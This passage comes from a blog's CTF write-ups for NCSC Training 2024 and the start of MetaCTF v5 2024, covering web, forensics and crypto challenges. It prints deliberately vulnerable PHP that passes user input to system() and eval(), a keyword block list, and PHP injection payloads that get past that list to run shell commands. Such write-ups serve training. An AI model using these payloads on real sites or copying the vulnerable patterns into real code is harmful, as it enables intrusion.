<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2&gt;</span>Text Banner Generator<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">""</span> <span class="na">method=</span><span class="s">"get"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"text"</span> <span class="na">placeholder=</span><span class="s">"Enter text for figlet"</span> <span class="na">required</span><span class="nt">&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Generate"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'text'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'text'</span><span class="p">];</span>

        <span class="nv">$command</span> <span class="o">=</span> <span class="s2">"figlet </span><span class="nv">$text</span><span class="s2">"</span><span class="p">;</span>

        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
        <span class="nb">system</span><span class="p">(</span><span class="nv">$command</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="cp">?&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;footer&gt;</span>
    <span class="nt">&lt;p&gt;</span>Powered by PHP and figlet<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;/footer&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-injectxec.png" alt="ncsc-training-injectxec" /></p>

<h3 id="file-hunt">File Hunt</h3>

<h4 id="challenge-description-3">Challenge Description</h4>

<p>Read the <code class="language-plaintext highlighter-rouge">flag.txt</code> in <code class="language-plaintext highlighter-rouge">home</code> directory of unknown user</p>

<h4 id="solution-3">Solution</h4>

<p>The challenge is a basic LFI, we will see some links that op and some other pages which is vulnerable to LFI, we can read the current users by accessing the <code class="language-plaintext highlighter-rouge">etc/passwd</code> file and then read the <code class="language-plaintext highlighter-rouge">flag.txt</code> file in the <code class="language-plaintext highlighter-rouge">home</code> directory of <code class="language-plaintext highlighter-rouge">john</code> user that we will find there.</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-filehunt.png" alt="ncsc-training-filehunt" /></p>

<h3 id="method">Method</h3>

<h4 id="challenge-description-4">Challenge Description</h4>

<p>HTTP defines a set of request methods to indicate the desired action to be performed for a given resource.</p>

<h4 id="solution-4">Solution</h4>

<p>The index pages open with an empty page that only has “Nothing Here” text, nothing in interesting in the page source too. So, I tried to access the <code class="language-plaintext highlighter-rouge">robots.txt</code> file and found the <code class="language-plaintext highlighter-rouge">Disallow: /index.php.bak</code>. Inside <code class="language-plaintext highlighter-rouge">index.php.bak</code> we found the following code:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="nv">$gg</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'gg'</span><span class="p">];</span>
<span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$gg</span><span class="p">);</span>
<span class="nv">$str</span> <span class="o">=</span> <span class="s1">'flag'</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$gg</span> <span class="o">==</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span>
<span class="k">echo</span> <span class="s1">'Well done! Next!'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>We can see the input is compared to the base64 of the string <code class="language-plaintext highlighter-rouge">flag</code>, so we can encode the string <code class="language-plaintext highlighter-rouge">flag</code> to base64 and pass it as the input to the index page and we will get the following results:</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-method-01.png" alt="ncsc-training-method-01" /></p>

<p>We got a new for what’s inside the code to work with next</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$GG</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"GG"</span><span class="p">];</span>
<span class="k">echo</span> <span class="nv">$GG</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$GG</span> <span class="o">==</span> <span class="s2">"flag"</span><span class="p">)</span>
    <span class="k">echo</span> <span class="s2">"flag { xxxxxxxx}"</span><span class="p">;</span>
</code></pre></div></div>

<p>We need to send a post request with the GG parameter being equal to flag text, If we try to modify the request manually (GET=&gt;POST) and add the body it will not work because we need to include add the <code class="language-plaintext highlighter-rouge">Content-Type: application/x-www-form-urlencoded</code> header too or we can use the terminal for that.</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-method-02.png" alt="ncsc-training-method-02" /></p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-method-03.png" alt="ncsc-training-method-03" /></p>

<h3 id="backdoor">Backdoor</h3>

<h4 id="challenge-description-5">Challenge Description</h4>

<p>&lt; No Description Provided &gt;</p>

<h4 id="solution-5">Solution</h4>

<p>This challenge was more fun than any other of the basic challenges in the CTF, the website index pages have a simple heading that says <strong><em>*Welcome Bro, What is your name?*</em></strong>, and nothing else around, not in the source and the robots or anywhere. So, I tried to look for any hidden files/directories and didn’t find anything, then I tried to fuzz any possible parameters in the index page, which also found nothing from the quick search.</p>

<p>I reread the page content and noticed the word <strong><em>*name*</em></strong> in the text, so I tried to pass the name parameter in the URL and got a reflected text when using it.</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-backdoor-01.png" alt="ncsc-training-backdoor-01" /></p>

<p>We still don’t have a clue about the nature of this input, I started fuzzing using burp intruder and random payloads, I also started throwing random characters and payloads till I saw the TryHarder response</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-backdoor-02.png" alt="ncsc-training-backdoor-02" /></p>

<p>I started removing characters from the payload until I got a new response</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-backdoor-03.png" alt="ncsc-training-backdoor-03" /></p>

<p>It seems that <code class="language-plaintext highlighter-rouge">&lt;</code> and many other characters and strings are prohibited. Anyway, from this error message, we now know that we are dealing with eval function and if we try to use any PHP builtin variable it will be interpreted so I started looking for a way to figure out how to execute system commands which also found the strings system, exec, passthru, and many others are blocked.</p>

<p>Without running a system command yet, we can call the <code class="language-plaintext highlighter-rouge">phpinfo()</code> using <code class="language-plaintext highlighter-rouge">?name=";phpinfo();//</code></p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-backdoor-04.png" alt="ncsc-training-backdoor-04" /></p>

<p>Now we can use some php tricks to call system without typing system with <code class="language-plaintext highlighter-rouge">";$v="syste"."m";$v("ls");//</code></p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-backdoor-05.png" alt="ncsc-training-backdoor-05" /></p>

<p>We found the flag file<code class="language-plaintext highlighter-rouge">never_find_flag.txt</code>, we can go and read it from there- But that’s not interesting at all, I want to dive more and cat it using the command injection.
If we try to read the file with <code class="language-plaintext highlighter-rouge">";$v="syste"."m";$v("cat never_find_flag.txt");//</code> we will get <code class="language-plaintext highlighter-rouge">The name is too long</code> response and if we somehow shrink the length for example using <code class="language-plaintext highlighter-rouge">cat *txt</code> we are going to get <code class="language-plaintext highlighter-rouge">Try Harder</code> because <code class="language-plaintext highlighter-rouge">cat</code> is blocked.</p>

<p>We need to get rid of these restrictions, after looking into PHP builtin variables I thought of using different request parameters, <code class="language-plaintext highlighter-rouge">$_GET</code> and <code class="language-plaintext highlighter-rouge">$_POST</code> are blocked, I tried <code class="language-plaintext highlighter-rouge">$_REQUEST</code> and it worked, and using this payload we kind of got unintended bling bling 🙂 <code class="language-plaintext highlighter-rouge">";$_REQUEST[1]($_REQUEST[2]);//&amp;1=system&amp;2=ls; cat never_find_flag.txt ; id</code></p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-backdoor-06.png" alt="ncsc-training-backdoor-06" /></p>

<p>I also checked the challenge source code, and the <code class="language-plaintext highlighter-rouge">$_REQUEST</code> was unintended because <code class="language-plaintext highlighter-rouge">Request</code> was one of the blocked keywords, though the used function to check was case-sensitive which allowed me to have this unintended solution.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$dangerousFunctions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'str_rot13'</span><span class="p">,</span> <span class="s1">'assert'</span><span class="p">,</span> <span class="s1">'include'</span><span class="p">,</span> <span class="s1">'copy'</span><span class="p">,</span> <span class="s1">'rename'</span><span class="p">,</span> <span class="s1">'Reqest'</span><span class="p">,</span> <span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">,</span> <span class="s1">'print'</span><span class="p">,</span> <span class="s1">'exec'</span><span class="p">,</span> <span class="s1">'shell_exec'</span><span class="p">,</span> <span class="s1">'popen'</span><span class="p">,</span> <span class="s1">'system'</span><span class="p">,</span> <span class="s1">'touch'</span><span class="p">,</span> <span class="s1">'echo'</span><span class="p">,</span> <span class="s1">'mv'</span><span class="p">,</span> <span class="s1">'cp'</span><span class="p">,</span> <span class="s1">'sed'</span><span class="p">,</span> <span class="s1">'``'</span><span class="p">,</span> <span class="s1">'passthru'</span><span class="p">,</span> <span class="s1">'proc_open'</span><span class="p">,</span> <span class="s1">'while'</span><span class="p">,</span> <span class="s1">'read '</span><span class="p">,</span> <span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'&lt;'</span><span class="p">,</span> <span class="s1">'nano'</span><span class="p">,</span> <span class="s1">'vi'</span><span class="p">,</span> <span class="s1">'vim'</span><span class="p">,</span> <span class="s1">'fopen'</span><span class="p">,</span> <span class="s1">'fgets'</span><span class="p">,</span> <span class="s1">'fgetc'</span><span class="p">,</span> <span class="s1">'file_get_contents'</span><span class="p">,</span> <span class="s1">'fwrite'</span><span class="p">,</span> <span class="s1">'file_put_contents'</span><span class="p">,</span> <span class="s1">'curl_exec'</span><span class="p">,</span> <span class="s1">'curl_multi_exec'</span><span class="p">,</span> <span class="s1">'parse_ini_file'</span><span class="p">,</span> <span class="s1">'sleep'</span><span class="p">,</span> <span class="s1">'rm'</span><span class="p">,</span> <span class="s1">'mkdir'</span><span class="p">,</span> <span class="s1">'}'</span><span class="p">,</span> <span class="s1">'show_source'</span><span class="p">,</span> <span class="s1">'symlink'</span><span class="p">,</span> <span class="s1">'apache_child_terminate'</span><span class="p">,</span> <span class="s1">'apache_setenv'</span><span class="p">,</span> <span class="s1">'define_syslog_variables'</span><span class="p">,</span> <span class="s1">'escapeshellarg'</span><span class="p">,</span> <span class="s1">'escapeshellcmd'</span><span class="p">,</span> <span class="s1">'eval'</span><span class="p">,</span> <span class="s1">'pcntl_exec'</span><span class="p">,</span> <span class="s1">'posix_kill'</span><span class="p">,</span> <span class="s1">'posix_mkfifo'</span><span class="p">,</span> <span class="s1">'posix_setpgid'</span><span class="p">,</span> <span class="s1">'posix_setsid'</span><span class="p">,</span> <span class="s1">'posix_setuid'</span><span class="p">,</span> <span class="s1">'posix_uname'</span><span class="p">,</span> <span class="s1">'proc_close'</span><span class="p">,</span> <span class="s1">'proc_get_status'</span><span class="p">,</span> <span class="s1">'proc_nice'</span><span class="p">,</span> <span class="s1">'proc_terminate'</span><span class="p">,</span> <span class="s1">'putenv'</span><span class="p">,</span> <span class="s1">'register_shutdown_function'</span><span class="p">,</span> <span class="s1">'register_tick_function'</span><span class="p">,</span> <span class="s1">'ini_set'</span><span class="p">,</span> <span class="s1">'set_time_limit'</span><span class="p">,</span> <span class="s1">'set_include_path'</span><span class="p">,</span> <span class="s1">'header'</span><span class="p">,</span> <span class="s1">'mail'</span><span class="p">,</span> <span class="s1">'readfile'</span><span class="p">,</span> <span class="s1">'file_get_contents'</span><span class="p">,</span> <span class="s1">'file_put_contents'</span><span class="p">,</span> <span class="s1">'unlink'</span><span class="p">,</span> <span class="s1">'cat'</span><span class="p">,</span> <span class="s1">'tail'</span><span class="p">,</span> <span class="s1">'head'</span><span class="p">,</span> <span class="s1">'more'</span><span class="p">,</span> <span class="s1">'less'</span><span class="p">,</span> <span class="s1">'dd'</span><span class="p">,</span> <span class="s1">'od'</span><span class="p">,</span> <span class="s1">'xxd'</span><span class="p">,</span> <span class="s1">'hexdump'</span><span class="p">,</span> <span class="s1">'file'</span><span class="p">,</span> <span class="s1">'awk'</span><span class="p">,</span> <span class="s1">'nano'</span><span class="p">,</span> <span class="s1">'vim'</span><span class="p">,</span> <span class="s1">'iconv'</span><span class="p">,</span> <span class="s1">'strings'</span><span class="p">,</span> <span class="s1">'rev'</span><span class="p">,</span> <span class="s1">'|'</span><span class="p">);</span>

<span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">36</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"The name is too long."</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nv">$dangerousFunctions</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$func</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">"Try Harder ;)"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>

<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;style&gt;</span>
        <span class="nt">body</span> <span class="p">{</span>
            <span class="nl">background-color</span><span class="p">:</span> <span class="no">black</span><span class="p">;</span>
            <span class="nl">height</span><span class="p">:</span> <span class="m">100vh</span><span class="p">;</span>
            <span class="nl">margin</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
            <span class="nl">display</span><span class="p">:</span> <span class="n">flex</span><span class="p">;</span>
            <span class="nl">justify-content</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
            <span class="nl">align-items</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
            <span class="nl">color</span><span class="p">:</span> <span class="no">white</span><span class="p">;</span>
            <span class="nl">font-size</span><span class="p">:</span> <span class="nb">x-large</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>

<span class="nt">&lt;body&gt;</span>
    <span class="cp">&lt;?php</span>

    <span class="nv">$str</span> <span class="o">=</span> <span class="s2">"echo </span><span class="se">\"</span><span class="s2">&lt;div style='position: fixed; top: 50; left: 50;'&gt;&lt;p style='font-size: x-large; color: white;'&gt;Welcome Bro, What is your name? "</span> <span class="mf">.</span> <span class="nv">$name</span> <span class="mf">.</span> <span class="s2">"&lt;/p&gt;&lt;/div&gt;</span><span class="se">\"</span><span class="s2">;"</span><span class="p">;</span>

    <span class="k">eval</span> <span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
    <span class="cp">?&gt;</span>
<span class="nt">&lt;/body&gt;</span>

<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>So I was so lucky to get the unintended solution through <code class="language-plaintext highlighter-rouge">$_REQUEST</code> because the list had <code class="language-plaintext highlighter-rouge">Request</code> and the stripos is case-sensetive.
But it here is another funny thing, we can do the same command injection technique using <code class="language-plaintext highlighter-rouge">$_COOKIE</code> instead of <code class="language-plaintext highlighter-rouge">$_REQUEST</code> and it will work</p>

<h2 id="digital-forensics">Digital Forensics</h2>

<h3 id="activity">Activity</h3>

<h4 id="challenge-description-6">Challenge Description</h4>

<p>Our DFIR team has detected potinal of SQL injection attack
Can you help us revels the attacker message ?</p>

<h4 id="solution-6">Solution</h4>

<p>The flag is the decode characters of the SQLi payload that is in the log file given</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">chars</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s1">'CHAR(78,67,83,67,123), CHAR(83,81,76,105), CHAR(95,52,95,84,104), CHAR(51,95,87,49,110), CHAR(125)'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\(.+?(?=\))'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'('</span> | <span class="nb">tr</span> <span class="s1">','</span> <span class="s1">'\n'</span><span class="si">)</span>
<span class="k">for </span>i <span class="k">in</span> <span class="sb">`</span><span class="nb">echo</span> <span class="nv">$chars</span><span class="sb">`</span><span class="p">;</span> <span class="k">do </span><span class="nb">printf</span> <span class="s1">'%b'</span> <span class="s2">"</span><span class="se">\x</span><span class="sb">`</span><span class="nb">printf</span> <span class="s1">'%x'</span> <span class="nv">$i</span><span class="sb">`</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-activity.png" alt="ncsc-training-activity" /></p>

<h3 id="traffic">Traffic</h3>

<h4 id="challenge-description-7">Challenge Description</h4>

<p>Network traffic or data traffic is the amount of data moving across a network at a given point of time.</p>

<h4 id="solution-7">Solution</h4>

<p>The challenge is a simple PCAP analysis, we can see the flag base64 encoded in one of the HTTP requests.</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-traffic.png" alt="ncsc-training-traffic" /></p>

<h3 id="recover">Recover</h3>
<h4 id="challenge-description-8">Challenge Description</h4>
<p>File carving is a great method for recovering files and fragments of files when directory entries are corrupt or missing</p>

<h4 id="solution-8">Solution</h4>

<p>The challenge is a simple file carving challenge, we can use <code class="language-plaintext highlighter-rouge">foremost</code> to carve the flag from the given image.</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-recover.png" alt="ncsc-training-recover" /></p>

<h3 id="meta">Meta</h3>
<h4 id="challenge-description-9">Challenge Description</h4>
<p>Find the `Creator of the image to get the flag 🙂</p>

<h4 id="solution-9">Solution</h4>

<p>The challenge is a simple metadata analysis challenge, we can use <code class="language-plaintext highlighter-rouge">exiftool</code> to get the metadata of the image and get the flag.</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-meta.png" alt="ncsc-training-meta" /></p>

<h3 id="fix">FIX</h3>
<h4 id="challenge-description-10">Challenge Description</h4>
<p>I believe you can repair the damage to the image.</p>

<h4 id="solution-10">Solution</h4>

<p>This challenge has a corrupted image, if we look at the hexdump of the file we will find a pattern of number <code class="language-plaintext highlighter-rouge">7</code> being repeated every one character in the file data, we can remove the <code class="language-plaintext highlighter-rouge">7</code> characters from the file and we will get a valid image file.</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-fix-01.png" alt="ncsc-training-fix-01" /></p>

<p>I asked ChatGPT to generate the following script which fixes the image by removing any byte at odd positions in the file.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">process_bytes</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">):</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">infile</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">infile</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>

    <span class="n">result</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
        <span class="nf">if </span><span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">2</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>  <span class="c1"># Keep bytes at even positions
</span>            <span class="n">result</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>

    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">outfile</span><span class="p">:</span>
        <span class="n">outfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="c1"># Usage
</span><span class="n">input_file</span> <span class="o">=</span> <span class="sh">'</span><span class="s">fix.png</span><span class="sh">'</span>  <span class="c1"># Your input file
</span><span class="n">output_file</span> <span class="o">=</span> <span class="sh">'</span><span class="s">fixed.png</span><span class="sh">'</span>  <span class="c1"># The file to write the processed data
</span><span class="nf">process_bytes</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-fix-02.png" alt="ncsc-training-fix-02" /></p>

<h2 id="cryptography">Cryptography</h2>

<h3 id="vigenvault">VigenVault</h3>
<h4 id="challenge-description-11">Challenge Description</h4>
<p>Uncover the final message that reveals the secret of the VigenVault.</p>

<p>The cipher is XGQM{Zgqilovc_Mmnrip_dcno_sd_cckwirbma_orabcndmmx_:t}</p>

<h4 id="solution-11">Solution</h4>

<p>The challenge is a simple Vigenere cipher, we can use an online <a href="https://www.dcode.fr/vigenere-cipher">tool</a> to decrypt the message and get the flag.</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-vigenvault.png" alt="ncsc-training-vigenvault" /></p>

<h3 id="simple-math">Simple Math</h3>

<h4 id="challenge-description-12">Challenge Description</h4>
<p>Solve this cipher by sharpening your Python coding skills. Build the right script, and unlock the secrets within.</p>

<h4 id="solution-12">Solution</h4>

<p>We got a script that does some math operations on message to generate cipher text, interestingly the script also has the reverse of those operations (decipher) so we just need to run the file to get the flag:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
<span class="n">x</span> <span class="o">=</span> <span class="nf">bytes_to_long</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>

<span class="n">cipher</span> <span class="o">=</span> <span class="p">((</span><span class="n">x</span> <span class="o">*</span> <span class="mi">1337</span><span class="p">)</span><span class="o">*</span><span class="mi">20</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span><span class="o">*</span><span class="mi">500</span>

<span class="nf">print</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>


<span class="c1"># cipher = 1848786658073065839007547107151090372652500805755396861145584876406219134322720000
</span>

<span class="n">ff</span> <span class="o">=</span> <span class="p">(((</span><span class="mi">1848786658073065839007547107151090372652500805755396861145584876406219134322720000</span><span class="o">//</span><span class="mi">500</span><span class="p">)</span><span class="o">+</span><span class="mi">100</span><span class="p">)</span><span class="o">//</span><span class="mi">20</span><span class="p">)</span><span class="o">//</span><span class="mi">1337</span>
<span class="nf">print</span><span class="p">(</span><span class="nf">long_to_bytes</span><span class="p">(</span><span class="n">ff</span><span class="p">))</span>
</code></pre></div></div>]]></content><author><name>Ahmad Abuzaid</name><email>iiahmad435@gmail.com</email></author><category term="CTF" /><category term="Writeups" /><category term="ctf" /><category term="writeups" /><category term="ncsc-training-2024" /><summary type="html"><![CDATA[Here are the write-ups for the challenges from the NCSC Training 2024 CTF, which took place from July 11th to July 13th, 2024.]]></summary></entry><entry><title type="html">MetaCTF v5 2024 Writeups</title><link href="http://0.0.0.0:8000/writeups/metactf-v5-2024" rel="alternate" type="text/html" title="MetaCTF v5 2024 Writeups" /><published>2024-07-10T00:00:00+03:00</published><updated>2024-07-10T00:00:00+03:00</updated><id>http://0.0.0.0:8000/writeups/metactf-v5</id><content type="html" xml:base="http://0.0.0.0:8000/writeups/metactf-v5-2024"><![CDATA[<p>Writeups for the MetaCTF v5 2024 CTF Web Challenges that was held on 30th June 2024.</p>

<h2 id="pythons-twister">Python’s Twister</h2>

<h3 id="challenge-description">Challenge Description</h3>

<p>Hack our admin.</p>

<h3 id="solution">Solution</h3>

<p>The challenge is a simple flask application that has register/login/pass-reset functionalities. The app generates 10000 random numbers and assigns one to each user when registered as a reset token, the admin has the reset token with index 1499. The flag is stored in an environment variable and is displayed when the admin logs in.</p>

<p>The first to look at is how the secrets are generated, they use python’s random and it doesn’t seem to be realistic (CTFs momento), we all know that the default random number generators in programming languages are predictable and Python is no exception. From Python <a href="https://docs.python.org/3/library/random.html">docs</a>:</p>

<blockquote>
  <p>Warning</p>

  <p>The pseudo-random generators of this module should not be used for security purposes. For security or cryptographic uses, see the <a href="https://docs.python.org/3/library/secrets.html#module-secrets"><code class="language-plaintext highlighter-rouge">secrets</code></a> module.</p>
</blockquote>

<p>The challenge code is as follows:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">flash</span>
<span class="kn">import</span> <span class="n">random</span>
<span class="kn">import</span> <span class="n">uuid</span>
<span class="kn">import</span> <span class="n">os</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">())</span>

<span class="c1"># Simulated database
</span><span class="n">users</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">reset_tokens</span> <span class="o">=</span> <span class="p">{}</span>

<span class="c1"># Function to generate 10000 random numbers and assign one to each user
</span><span class="k">def</span> <span class="nf">generate_random_numbers</span><span class="p">():</span>
    <span class="n">random_numbers</span> <span class="o">=</span> <span class="p">[</span><span class="n">random</span><span class="p">.</span><span class="nf">getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">)]</span>
    <span class="k">return</span> <span class="n">random_numbers</span>

<span class="n">random_numbers</span> <span class="o">=</span> <span class="nf">generate_random_numbers</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">get_username_by_secret</span><span class="p">(</span><span class="n">users</span><span class="p">,</span> <span class="n">secret</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">username</span><span class="p">,</span> <span class="n">info</span> <span class="ow">in</span> <span class="n">users</span><span class="p">.</span><span class="nf">items</span><span class="p">():</span>
        <span class="k">if</span> <span class="n">info</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">secret</span><span class="sh">'</span><span class="p">)</span> <span class="o">==</span> <span class="n">secret</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">username</span>
    <span class="k">return</span> <span class="bp">None</span>

<span class="c1"># Function to generate a random secret
</span><span class="k">def</span> <span class="nf">generate_secret</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="n">random_int</span> <span class="o">=</span> <span class="n">random_numbers</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">random_int</span><span class="si">}</span><span class="sh">"</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span>
